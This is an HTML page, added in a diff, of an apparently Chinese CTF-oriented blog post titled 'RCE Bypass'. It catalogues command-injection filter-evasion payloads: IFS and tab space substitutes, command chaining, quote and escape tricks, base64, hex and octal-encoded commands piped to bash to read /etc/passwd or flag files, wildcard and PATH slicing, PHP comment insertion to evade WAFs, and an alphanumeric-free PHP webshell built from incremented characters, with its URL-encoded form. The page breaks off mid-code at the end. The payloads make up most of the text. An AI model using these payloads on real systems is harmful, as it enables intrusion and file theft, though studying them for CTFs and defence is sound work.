@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>RCE Bypass - 天下同春</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="RCE Bypass - 天下同春" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2024/02/26/rce_bypass/index.html" />
+  
+  <meta property="og:image" content="/img/LR.jpg" />
+  
+  <meta property="og:article:published_time" content="2024-02-26T11:00:08.000Z" />
+  
+  <meta property="og:article:author" content="void2eye" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+    <script src='https://unpkg.com/@waline/client@v2/dist/waline.js'></script>
+    <link
+      rel="stylesheet"
+      href="https://unpkg.com/@waline/client@v2/dist/waline.css"
+    />
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">天下同春</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/">Home</a>
+            
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/void2eye" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/Web/">Web</a>
+        
+            <a href="/categories/Web/RCE/">RCE</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>February</span>
+            <span>26,</span>
+            <span>2024</span>
+        </div>
+        
+
+        <h1 class="title">RCE Bypass</h1>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="命令空格绕过"><a href="#命令空格绕过" class="headerlink" title="命令空格绕过"></a>命令空格绕过</h1><h2 id="bash下"><a href="#bash下" class="headerlink" title="bash下"></a>bash下</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;IFS&#125;</span><span class="variable">$9</span></span><br><span class="line">&#123;IFS&#125;</span><br><span class="line"><span class="variable">$IFS</span></span><br><span class="line"><span class="variable">$&#123;IFS&#125;</span></span><br><span class="line">$IFS<span class="variable">$1</span> //<span class="variable">$1</span>改成$加其他数字貌似都行</span><br><span class="line">IFS</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;<span class="built_in">cat</span>,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line">%20   (space)</span><br><span class="line">%09   (tab) /r</span><br><span class="line">X=$<span class="string">&#x27;cat\x09./flag.php&#x27;</span>;<span class="variable">$X</span>       （\x09表示tab，也可以用\x20）</span><br><span class="line">/**/</span><br></pre></td></tr></table></figure>
+
+<h1 id="命令连接"><a href="#命令连接" class="headerlink" title="命令连接"></a>命令连接</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">win and linux</span><br><span class="line">;     前面的执行完执行后面的 </span><br><span class="line">|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）         </span><br><span class="line">||    当前面的执行出错时（为假）执行后面的</span><br><span class="line">&amp;     将任务置于后台执行</span><br><span class="line">&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真</span><br><span class="line">%0a  （换行）</span><br><span class="line">%0d  （回车）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>关于|：</p>
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240715134329275.png" alt="image-20240715134329275"></p>
+<p>而<code>ping 127.0.0.1 | ls /</code>成功执行的原因是但是，<code>ls /</code> 并不需要任何输入，它会立即执行并完成。</p>
+<h1 id="特定字符绕过"><a href="#特定字符绕过" class="headerlink" title="特定字符绕过"></a>特定字符绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ca\t /fl\ag  <span class="comment">//转义</span></span><br><span class="line">a=c;b=a;c=t;$a$b<span class="variable">$c</span> /etc/passwd</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Y2F0IC9ldGMvcGFzc3dk&#x27;</span> | base64 -d | bash</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Y2F0IC9ldGMvcGFzc3dk&#x27;</span> | base64 -d | sh <span class="comment">//linux</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;636174202f666c6167&quot;</span> | xxd -r -p | bash <span class="comment">//16进制，注意hex后的0x不需要 cat /flag</span></span><br><span class="line">$(printf <span class="string">&#x27;\154\163&#x27;</span>) <span class="comment">//oct,八进制，ls。注意要单引号，否则bash识别不了。$()等同于``</span></span><br><span class="line">`printf <span class="string">&#x27;\154\163&#x27;</span>` <span class="comment">//printf &#x27;\154\163&#x27;是不会换行的，会输出ls%，要printf &#x27;\154\163\n&#x27;</span></span><br><span class="line">$(printf <span class="string">&#x27;\x6c\x73&#x27;</span>) <span class="comment">//当然也可以16进制 ls</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240715142111579.png" alt="image-20240715142111579"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(sy.(st).em)(<span class="built_in">whoami</span>);一般用于非shell环境，如上</span><br><span class="line"></span><br><span class="line">c<span class="string">&#x27;&#x27;</span>a<span class="string">&#x27;&#x27;</span>t /etc/passwd //两个单引号</span><br><span class="line">c``a``t /etc/passwd // 两个反斜杠</span><br><span class="line">c<span class="string">&quot;&quot;</span>a<span class="string">&quot;&quot;</span>t /etc/passwd // 两个双引号</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240715143714016.png" alt="image-20240715143714016"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">注意只能在shell环境下执行。system不行，如上图。</span><br><span class="line">$*和<span class="variable">$@</span>，<span class="variable">$x</span>(x 代表 1-9),<span class="variable">$&#123;x&#125;</span>(x&gt;=10) :比如ca<span class="variable">$&#123;21&#125;</span>t a.txt表示<span class="built_in">cat</span> a.txt 在没有传入参数的情况下,这些特殊字符默认为空,如下:</span><br><span class="line">wh<span class="variable">$1oami</span></span><br><span class="line"><span class="built_in">who</span><span class="variable">$@ami</span></span><br><span class="line">whoa$*mi</span><br><span class="line"></span><br><span class="line">666`<span class="built_in">whoami</span>`666 //bash: 666root666: <span class="built_in">command</span> not found</span><br><span class="line"></span><br><span class="line">666`\<span class="built_in">whoami</span>`666 //bash: 666root666: <span class="built_in">command</span> not found</span><br><span class="line"></span><br><span class="line">//命令执行后的结果在2个666中间</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">插入注释（这对于绕过阻止特定PHP函数名称的WAF规则集很有用）</span><br><span class="line"></span><br><span class="line">system/*A10ng_*/(<span class="built_in">whoami</span>);</span><br><span class="line"></span><br><span class="line">system/*A10ng_*/(wh./*A10ng_*/(oa)/*caixukun*/.mi);</span><br><span class="line"></span><br><span class="line">(sy./*A10ng_*/(st)/*A10ng_*/.em)/*A10ng_*/(wh./*A10ng_*/(oa)/*A10ng_*/.mi); //注意不要写在正里面，cmd=(sy.(s).tem)(wh.(o).a/*void2eye*/mi);，要写成cmd=(sy.(s).tem)(wh.(o)/*void2eye*/.ami);</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240715154456280.png" alt="image-20240715154456280"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">利用未初始化变量，使用<span class="variable">$u</span>绕过</span><br><span class="line"><span class="built_in">cat</span> /etc<span class="variable">$u</span>/passwd</span><br><span class="line">----------------------------------------------</span><br><span class="line">过滤了斜杠‘/’</span><br><span class="line">可利用<span class="string">&#x27;;&#x27;</span>拼接命令绕过</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ..;<span class="built_in">cd</span> ..;<span class="built_in">cd</span> ..;<span class="built_in">cd</span> ..;<span class="built_in">cd</span> etc;<span class="built_in">cat</span> passwd</span><br><span class="line">---------------------------------------------</span><br><span class="line">利用通配符绕过：(能用的很少)</span><br><span class="line">列如<span class="built_in">cat</span> /passwd：</span><br><span class="line"></span><br><span class="line">??? /e??/?a????</span><br><span class="line"><span class="built_in">cat</span> /e*/pa*</span><br><span class="line"></span><br><span class="line">-------------------------------------------------</span><br><span class="line">glob通配符：</span><br><span class="line">在glob里</span><br><span class="line"></span><br><span class="line">“ [A-Fa-f0-9] ”相当于 <span class="string">&quot; [ABCDEFabcdef0123456789] &quot;</span>.)</span><br><span class="line"></span><br><span class="line">“ [-%] ”代表“ [!”#$%] ”而“ [a-z] ”代表“任何 小写字母”</span><br><span class="line"></span><br><span class="line">利用[@-[]来表示大写字母：</span><br><span class="line"></span><br><span class="line">[...]表示匹配方括号之中的任意一个字符</span><br><span class="line"></span><br><span class="line">&#123;…&#125;表示匹配大括号里面的所有模式，模式之间使用逗号分隔。</span><br><span class="line"></span><br><span class="line">&#123;...&#125;与[...]有一个重要的区别，当匹配的文件不存在，[...]会失去模式的功能，变成一个单纯的字符串，而&#123;...&#125;依然可以展开</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> t[a-z]st</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> t&#123;a,b,c,d,e,f&#125;st</span><br><span class="line"></span><br><span class="line">// 注意这个是用来匹配文件名的，比如<span class="built_in">ls</span> <span class="built_in">log</span>[0-9]</span><br><span class="line">// <span class="built_in">cat</span> file&#123;1,2,3&#125;.txt</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">利用PATH绕过</span><br><span class="line">可以通过截断和拼接来得到我们想要的来getshell</span><br><span class="line"></span><br><span class="line"><span class="variable">$&#123;PATH:5:1&#125;</span> //l</span><br><span class="line"></span><br><span class="line"><span class="variable">$&#123;PATH:2:1&#125;</span> //s</span><br><span class="line"></span><br><span class="line"><span class="variable">$&#123;PATH:5:1&#125;</span><span class="variable">$&#123;PATH:2:1&#125;</span> //拼接后是<span class="built_in">ls</span>,执行命令</span><br><span class="line"></span><br><span class="line"><span class="variable">$&#123;PATH:5:1&#125;</span>s //拼接后是<span class="built_in">ls</span>,执行命令</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240715160531062.png" alt="image-20240715160531062"></p>
+<h1 id="无数字字母rce"><a href="#无数字字母rce" class="headerlink" title="无数字字母rce"></a>无数字字母rce</h1><h2 id="自增绕过："><a href="#自增绕过：" class="headerlink" title="自增绕过："></a>自增绕过：</h2><p>‘a’++ &#x3D;&gt; ‘b’，’b’++ &#x3D;&gt; ‘c’… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。</p>
+<p>那么，如何拿到一个值为字符串’a’的变量呢？</p>
+<p>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[].[]; <span class="comment">//俩数组拼接强行返回ArrayArray,这里一个短杠的值也就是ArrayArray</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;&#x27;</span>;  <span class="comment">//两个短杠赋值为空</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>];<span class="comment">//从arrayarray中取首字符，即a。这里$_=$_[0]也是一样的道理，不过waf限制数字输入</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//b</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//c</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//d</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//e</span></span><br><span class="line"><span class="variable">$__</span>.=<span class="variable">$_</span>; <span class="comment">//E  把两个短杠赋值为E</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//F  一个短杠继续自增</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//G </span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$__</span>; <span class="comment">// GE  一个短杠自增变成了G，两个短杠在前面第十一行处已经赋值为E，拼接得GE</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//H 此处一个短杠继续自增，为H</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//I</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//J</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//k</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//L</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//M</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//N</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//O</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//P</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//Q</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//R</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//S</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//T</span></span><br><span class="line"><span class="variable">$__</span>.=<span class="variable">$_</span>; <span class="comment">// GET 在此处，两条短杠原是GE与一条短杠（已经自增为T），.=拼接，构成get</span></span><br><span class="line">$&#123;<span class="string">&#x27;_&#x27;</span>.<span class="variable">$__</span>&#125;[_]($&#123;<span class="string">&#x27;_&#x27;</span>.<span class="variable">$__</span>&#125;[__]); <span class="comment">// 进行拼接，$_GET[&#x27;_&#x27;]($_GET[&#x27;__&#x27;]);</span></span><br><span class="line"></span><br><span class="line">url编码后：</span><br><span class="line">%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">5</span>b%<span class="number">5</span>d.%<span class="number">5</span>b%<span class="number">5</span>d%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">3</span>d%<span class="number">27</span>%<span class="number">27</span>%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">5</span>b%<span class="number">27</span>%<span class="number">27</span>%<span class="number">5</span>d%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__.%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">3</span>d%<span class="number">24</span>_.%<span class="number">24</span>__%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__.%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>%<span class="number">7</span>b%<span class="number">27</span>_%<span class="number">27</span>.%<span class="number">24</span>__%<span class="number">7</span>d%<span class="number">5</span>b_%<span class="number">5</span>d(%<span class="number">24</span>%<span class="number">7</span>b%<span class="number">27</span>_%<span class="number">27</span>.%<span class="number">24</span>__%<span class="number">7</span>d%<span class="number">5</span>b__%<span class="number">5</span>d)%<span class="number">3</span>b</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; <span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// E </span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$____</span>.=<span 